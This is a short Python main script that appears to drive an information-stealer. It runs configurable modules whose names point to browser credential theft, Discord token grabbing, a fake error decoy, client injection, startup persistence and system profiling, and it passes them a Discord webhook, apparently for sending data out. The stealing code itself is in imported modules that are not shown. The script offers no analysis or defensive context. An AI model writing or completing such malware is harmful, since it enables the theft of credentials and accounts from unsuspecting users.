from util.chromium import *
from util.debug import *
from util.discord import *
from util.fakeerror import *
from util.injection import *
from util.exectime import *
from util.startup import *
from util.systeminfo import *
from config import __CONFIG__

def main():
    funcs = [
        debug,
        chromium,
        discord,
        fake_error,
        Injection,
        exec_time,
        startup,
        SystemInfo,
    ]

    for func in funcs:
        if __CONFIG__[func.__name__.lower()]:
            if func.__init__.__code__.co_argcount == 2:
                func(__CONFIG__['webhook'])
            else:
                func()

if __name__ == '__main__':
    main()
